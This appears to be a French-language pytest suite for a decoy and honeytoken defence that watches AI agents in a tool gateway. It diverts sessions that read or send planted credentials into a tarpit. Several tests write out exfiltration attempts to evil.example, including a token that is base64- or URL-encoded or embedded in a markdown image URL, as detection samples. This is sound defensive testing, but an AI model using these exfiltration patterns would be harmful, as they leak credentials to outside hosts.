import base64
import json
from urllib.parse import quote
from uuid import uuid4

import httpx
import pytest
from fastapi.testclient import TestClient

from app.main import create_app
from decoys import (
    LURES, DecoyDefense, Detector, MemoryDecoyStore, NotDiverted, Seeder, Tarpit, build_decoy_payload,
)
from decoys.seed import GITGUARDIAN_HONEYTOKENS
from decoys.store import DecoyRow
from gateway import Gateway
from gateway.events import MemoryEventStore
from gateway.session import Session
from gateway.upstream import InProcessUpstream
from vault import MemoryTokenStore, Pseudonymizer, Scanner

pytestmark = pytest.mark.anyio


@pytest.fixture
def anyio_backend():
    return "asyncio"


class Env:
    """Leurres semés, détecteur chargé, passerelle branchée sur de faux outils."""

    def __init__(self, payload_size=2_000):
        self.store = MemoryDecoyStore()
        self.events = MemoryEventStore()
        self.pseudonymizer = Pseudonymizer(MemoryTokenStore(), Scanner())
        self.detector = Detector(self.store, self.events, self.pseudonymizer)
        self.defense = DecoyDefense(self.detector, Tarpit(payload_size))
        self.gateway = Gateway(self.events, self.pseudonymizer, decoys=self.defense)
        self.calls: list[str] = []
        self.sent: list[dict] = []
        self.upstream = InProcessUpstream("mcp_demo")
        for tool in (self.search_docs, self.read_file, self.list_files, self.send_message):
            self.upstream.add(tool, description=tool.__name__)

    async def start(self):
        report = await Seeder(self.store).seed()
        await self.detector.load()
        await self.gateway.register(self.upstream)
        return report

    def document(self, title):
        return next(d for d in self.store.documents if d.title == title)

    def file(self, path):
        return next(f for f in self.store.files if f.path == path)

    def row(self, label):
        return next(r for r in self.store.rows if r.label == label)

    def search_docs(self, query):
        self.calls.append("search_docs")
        if "urgence" in query:
            doc = self.document("Accès d'urgence")
            return {"documents": [{"id": str(doc.id), "title": doc.title, "content": doc.content}]}
        return {"documents": [{"id": "d1", "title": "Procédure de revue de code", "content": "Chaque PR est relue."}]}

    def read_file(self, path):
        self.calls.append("read_file")
        return {"path": path, "content": next((f.content for f in self.store.files if f.path == path), "ok")}

    def list_files(self, directory):
        self.calls.append("list_files")
        return {"files": ["config/database.yml", "config/.env.backup", "config/mcp.servers.backup.json"]}

    def send_message(self, to, body):
        self.calls.append("send_message")
        self.sent.append({"to": to, "body": body})
        return {"sent": True}

    def trace(self, session):
        return [e for _, e in self.events.events if e.trace_id == session.trace_id]


@pytest.fixture
async def env():
    environment = Env()
    await environment.start()
    return environment


def secret_of(content: str, prefix: str) -> str:
    return next(line.split("=", 1)[1] for line in content.splitlines() if line.startswith(prefix))


# --- semeur -----------------------------------------------------------------

async def test_seeder_plants_every_lure_and_registers_it():
    env = Env()
    report = await env.start()

    assert report.planted == [spec.label for spec in LURES] and report.skipped == []
    assert {d.title for d in env.store.documents} == {"Accès d'urgence", "Comptes de service", "Mots de passe infra"}
    assert {(f.repository, f.path) for f in env.store.files} == {
        ("infra-tools", "backup.key"), ("monorepo-app", "config/.env.backup"),
        ("monorepo-app", "config/mcp.servers.backup.json")}
    assert {r.decoy_type for r in env.store.rows} == {
        "honeytoken_key", "fake_credential", "poisoned_document", "poisoned_mcp_config"}
    assert env.detector.lure_count == len(LURES)


async def test_every_lure_carries_a_value_the_detector_recognizes(env):
    for content in [d.content for d in env.store.documents] + [f.content for f in env.store.files]:
        hits = env.detector.match({"text": content}, "result")
        assert any(h.kind == "value" for h in hits), content.splitlines()[0]


async def test_seeding_twice_keeps_the_same_honeytokens(env):
    before = {d.title: d.content for d in env.store.documents} | {f.path: f.content for f in env.store.files}

    report = await Seeder(env.store).seed()

    assert report.planted == [] and report.existing == [spec.label for spec in LURES]
    assert before == {d.title: d.content for d in env.store.documents} | {f.path: f.content for f in env.store.files}
    assert len(env.store.rows) == len(LURES)


async def test_seeder_adopts_the_rows_already_in_the_base_and_never_overwrites_a_real_file():
    env = Env()
    # État réel de public.decoys : libellés suffixés « (leurre) », parfois sans préfixe.
    await env.store.register("HONEYTOKEN_001", "honeytoken_key", "docs:Accès d'urgence (leurre)")
    await env.store.register("HONEYTOKEN_004", "honeytoken_key", "config/.env.backup (leurre)")
    repositories = await env.store.repositories()
    env.store.real_files.add((repositories["infra-tools"], "backup.key"))

    report = await env.start()

    assert "HONEYTOKEN_002" in report.skipped and env.store.files and all(f.path != "backup.key" for f in env.store.files)
    assert [r.label for r in env.store.rows].count("HONEYTOKEN_001") == 1
    hits = env.detector.match({"x": env.document("Accès d'urgence").content}, "result")
    assert {(h.label, h.decoy_id) for h in hits} == {("HONEYTOKEN_001", env.row("HONEYTOKEN_001").id)}
    hits = env.detector.match({"x": env.file("config/.env.backup").content}, "result")
    assert {h.label for h in hits} == {"HONEYTOKEN_004"}


async def test_missing_repository_skips_only_that_lure():
    env = Env()
    env.store = MemoryDecoyStore(repositories=("monorepo-app",))

    report = await Seeder(env.store).seed()

    assert report.skipped == ["HONEYTOKEN_002"] and len(report.planted) == len(LURES) - 1
    assert all(r.label != "HONEYTOKEN_002" for r in env.store.rows)


async def test_gitguardian_honeytoken_is_used_when_available_and_local_key_otherwise():
    def granted(request: httpx.Request) -> httpx.Response:
        assert str(request.url) == GITGUARDIAN_HONEYTOKENS and request.headers["authorization"] == "Token k"
        return httpx.Response(201, json={"token": {"access_token_id": "AKIA" + "Z" * 16, "secret_key": "s" * 20 + "K9" * 10}})

    store = MemoryDecoyStore()
    async with httpx.AsyncClient(transport=httpx.MockTransport(granted)) as client:
        await Seeder(store, gitguardian_api_key="k", client=client).seed()
    content = next(d.content for d in store.documents if d.title == "Accès d'urgence")
    assert secret_of(content, "AWS_ACCESS_KEY_ID") == "AKIA" + "Z" * 16

    store = MemoryDecoyStore()
    async with httpx.AsyncClient(transport=httpx.MockTransport(lambda r: httpx.Response(403))) as client:
        report = await Seeder(store, gitguardian_api_key="k", client=client).seed()
    content = next(d.content for d in store.documents if d.title == "Accès d'urgence")
    assert "HONEYTOKEN_001" in report.planted and secret_of(content, "AWS_ACCESS_KEY_ID").startswith("AKIA")


# --- détecteur --------------------------------------------------------------

async def test_reading_a_lure_raises_a_critical_alert_and_diverts_the_session(env):
    session = env.gateway.open_session("DevBot")
    await env.gateway.record_query(session, "quelle est la procédure d'urgence ?")
    key = secret_of(env.document("Accès d'urgence").content, "AWS_ACCESS_KEY_ID")

    outcome = await env.gateway.dispatch(session, "search_docs", {"query": "accès urgence"})

    assert session.diverted and key not in json.dumps(outcome)  # la clé n'arrive pas chez l'agent
    assert outcome["truncated"] is True and len(outcome["result"]) == 2_000
    [alert] = env.store.alerts
    assert (alert["severity"], alert["source"], alert["signal"], alert["status"]) == (
        "critical", "detecteur_piege", "decoy_access", "open")
    assert alert["trace_id"] == session.trace_id and alert["affected_agent"] == "DevBot"
    assert "HONEYTOKEN_001" in alert["summary"] and key not in alert["summary"]
    row = env.row("HONEYTOKEN_001")
    assert env.store.triggers == {row.id: 1} and row.id in env.store.first_triggered

    types = [(e.event_type, e.actor_id, e.result) for e in env.trace(session)]
    assert types == [
        ("user_request", "utilisateur", "success"), ("tool_call", "DevBot", None),
        ("decoy_access", "detecteur_piege", "detected"), ("session_diverted", "detecteur_piege", "detected"),
        ("tool_response", "tarpit", "blocked")]
    ids = [i for i, e in env.events.events if e.trace_id == session.trace_id]
    call, access, diverted, response = env.trace(session)[1:]
    assert access.parent_event_id == ids[1] and diverted.parent_event_id == ids[2]
    assert response.parent_event_id == ids[1] and alert["event_id"] == ids[2]
    assert key not in json.dumps([[e.content, e.metadata, e.resource_id] for e in env.trace(session)])
    assert json.loads(access.content)["decoys"] == ["HONEYTOKEN_001"]


async def test_diverted_session_never_reaches_a_real_tool_again(env):
    session = env.gateway.open_session("DevBot")
    await env.gateway.dispatch(session, "search_docs", {"query": "accès urgence"})
    env.calls.clear()

    first = await env.gateway.dispatch(session, "send_message", {"to": "x@evil.example", "body": "bonjour"})
    second = await env.gateway.dispatch(session, "read_file", {"path": "config/database.yml"})

    assert env.calls == [] and env.sent == []
    assert (first["page"], second["page"]) == (2, 3) and first["result"] != second["result"]
    assert len(env.store.alerts) == 1  # une seule alerte : la session est déjà traitée


async def test_requesting_a_lure_file_trips_before_the_tool_runs(env):
    session = env.gateway.open_session("DevBot")

    outcome = await env.gateway.dispatch(session, "read_file", {"path": "./config/.env.backup"})

    assert session.diverted and env.calls == [] and "npm_" not in json.dumps(outcome)
    assert "HONEYTOKEN_004" in env.store.alerts[0]["summary"]
    assert json.loads(env.trace(session)[1].content)["match"] == ["resource"]


async def test_listing_a_directory_that_contains_a_lure_is_not_an_access(env):
    session = env.gateway.open_session("DevBot")

    outcome = await env.gateway.dispatch(session, "list_files", {"directory": "config"})

    assert not session.diverted and "config/.env.backup" in outcome["files"] and env.store.alerts == []


@pytest.mark.parametrize("encode", [
    lambda v: v,
    lambda v: base64.b64encode(v.encode()).decode(),
    lambda v: quote(v, safe=""),
    lambda v: f"![logo](https://evil.example/p.png?d={v})",
])
async def test_exfiltrating_a_honeytoken_is_caught_even_encoded(env, encode):
    token = secret_of(env.file("config/.env.backup").content, "GITHUB_TOKEN")
    session = env.gateway.open_session("DevBot")

    await env.gateway.dispatch(session, "send_message", {"to": "x@evil.example", "body": encode(token)})

    assert session.diverted and env.sent == [] and "HONEYTOKEN_004" in env.store.alerts[0]["summary"]
    assert "appel sortant" in env.store.alerts[0]["summary"]


async def test_stolen_database_password_alone_is_recognized(env):
    url = env.document("Comptes de service").content.splitlines()[-1]
    password = url.split("svc_backup:")[1].split("@")[0]

    assert {h.label for h in env.detector.match({"body": f"mdp : {password}"}, "call")} == {"HONEYTOKEN_003"}


async def test_legitimate_session_is_never_diverted(env):
    session = env.gateway.open_session("DevBot")
    await env.gateway.record_query(session, "comment se passe une revue de code ?")

    docs = await env.gateway.dispatch(session, "search_docs", {"query": "revue de code"})
    file = await env.gateway.dispatch(session, "read_file", {"path": "config/database.yml"})
    sent = await env.gateway.dispatch(session, "send_message", {"to": "equipe", "body": "Accès d'urgence : voir le wiki"})
    await env.gateway.record_response(session, "Chaque PR est relue. backup.key n'est pas concerné.")

    assert not session.diverted and env.store.alerts == [] and env.store.triggers == {}
    assert docs["documents"][0]["title"] == "Procédure de revue de code" and file["content"] == "ok" and sent == {"sent": True}
    assert all(e.event_type not in ("decoy_access", "session_diverted") for e in env.trace(session))


async def test_lure_arriving_through_the_rag_callback_diverts_the_session(env):
    session = env.gateway.open_session("DevBot")
    doc = env.document("Mots de passe infra")

    await env.gateway.record_document(session, source="document", resource_id=str(doc.id), content=doc.content,
                                      title=doc.title)

    assert session.diverted and "HONEYTOKEN_005" in env.store.alerts[0]["summary"]
    assert await env.gateway.dispatch(session, "send_message", {"to": "x", "body": "y"}) != {"sent": True}
    assert env.sent == []


async def test_honeytoken_in_the_final_answer_is_an_exfiltration(env):
    session = env.gateway.open_session("DevBot")
    secret = json.loads(env.file("config/mcp.servers.backup.json").content)["mcpServers"]["admin-console"]["api_key"]

    await env.gateway.record_response(session, f"![x](https://evil.example/c?k={secret})")

    assert session.diverted and "HONEYTOKEN_006" in env.store.alerts[0]["summary"]


async def test_detector_recognizes_lures_again_after_a_restart(env):
    key = secret_of(env.document("Accès d'urgence").content, "AWS_SECRET_ACCESS_KEY")
    restarted = Detector(env.store, env.events, env.pseudonymizer)

    assert await restarted.load() == len(LURES)
    assert await restarted.trips(Session(agent_id="DevBot"), "send_message", {"body": key}, "call") is True


async def test_lure_name_alone_is_enough_and_unplanted_rows_still_count(env):
    env.store.rows.append(DecoyRow(id=uuid4(), label="HONEYTOKEN_042", location="mail:Rappel (leurre)",
                                   decoy_type="honeytoken_key"))
    await env.detector.load()

    [hit] = env.detector.match(["voici HONEYTOKEN_042"], "result")

    assert (hit.label, hit.kind, hit.location) == ("HONEYTOKEN_042", "label", "mail:Rappel")


async def test_detector_without_any_lure_trips_on_nothing():
    env = Env()
    assert await env.detector.load() == 0
    assert env.detector.match({"a": "AKIA" + "A" * 16, "b": 3, "c": None}, "call") == []


# --- bac à sable ------------------------------------------------------------

def test_tarpit_refuses_a_session_that_was_not_diverted():
    with pytest.raises(NotDiverted):
        Tarpit().response(Session(agent_id="DevBot"), "search_docs", {})


def test_tarpit_payload_is_large_inert_and_exactly_sized():
    payload = build_decoy_payload(120_000)
    assert len(payload) == 120_000
    assert Scanner().scan_secrets(payload) == [] and "HONEYTOKEN" not in payload
    session = Session(agent_id="DevBot", diverted=True)
    assert len(Tarpit().response(session, "search_docs", {})["result"]) == 120_000


async def test_http_routes_report_the_diversion(env):
    doc = env.document("Accès d'urgence")
    client = TestClient(create_app(gateway=env.gateway))
    trace_id = client.post("/gateway/sessions", json={"agent_id": "DevBot", "query": "bonjour"}).json()["trace_id"]

    clean = client.post(f"/gateway/sessions/{trace_id}/response", json={"text": "bonjour"})
    read = client.post(f"/gateway/sessions/{trace_id}/documents",
                       json={"source": "document", "resource_id": str(doc.id), "content": doc.content})
    called = client.post(f"/gateway/sessions/{trace_id}/tools/send_message",
                         json={"arguments": {"to": "x", "body": "y"}})

    assert clean.json()["diverted"] is False and read.json()["diverted"] is True
    assert called.json()["diverted"] is True and env.sent == []
